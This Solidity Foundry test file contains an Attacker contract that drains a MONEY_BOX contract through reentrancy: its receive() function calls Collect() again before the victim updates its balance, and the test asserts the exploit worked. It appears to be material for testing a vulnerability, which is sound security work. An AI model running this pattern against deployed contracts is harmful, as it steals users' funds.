
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {MONEY_BOX, Log} from "../src/MONEY_BOX.sol";

contract TestReentrancyMONEY_BOX is Test {
    MONEY_BOX public _contractUnderTest;
    Log public _logFile;
    Attacker public _attacker;

    function setUp() public {
        _logFile = new Log();
        _contractUnderTest = new MONEY_BOX();
        _contractUnderTest.SetLogFile(address(_logFile));
        _contractUnderTest.SetMinSum(1 ether);
        _contractUnderTest.Initialized();
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal >= 1 ether);
        vm.assume(attackVal <= 10 ether);

        // --- 2. State Configuration (Pre-Condition) ---
        // The Collect function requires:
        // - acc.balance >= MinSum
        // - acc.balance >= _am
        // - block.timestamp > acc.unlockTime
        
        // Warp time forward to ensure unlockTime condition is met
        vm.warp(block.timestamp + 1);

        // --- 3. Funding ---
        // Fund the Victim contract with extra ETH (so there's ETH to steal beyond attacker's deposit)
        vm.deal(address(_contractUnderTest), attackVal * 3);
        
        // Fund the Attacker
        vm.deal(address(_attacker), attackVal * 2);

        // Fund the Test Contract
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    MONEY_BOX public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        victim = MONEY_BOX(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackVal = val;
        
        // Deposit into the MONEY_BOX with unlockTime of 0 (immediate unlock)
        victim.Put{value: msg.value}(0);
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State - balance before attack
        initialSnapshot = address(this).balance;

        // 2. Store the value for the re-entrant call
        storedAttackVal = val;
        attackCallCount = 0;

        // 3. Call the vulnerable function
        victim.Collect(val);

        // 4. Verify Success Conditions
        // If we withdrew more than once (reentrancy occurred), the attack succeeded
        // We check if our balance increased by more than the single withdrawal amount
        // or if attackCallCount shows multiple entries
        if (attackCallCount >= 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        attackCallCount++;
        if (attackCallCount < 2) {            
            // Re-enter the contract - the balance hasn't been updated yet
            // so we can withdraw again
            if (address(victim).balance >= storedAttackVal) {
                victim.Collect(storedAttackVal);
            }
        }
    }
}
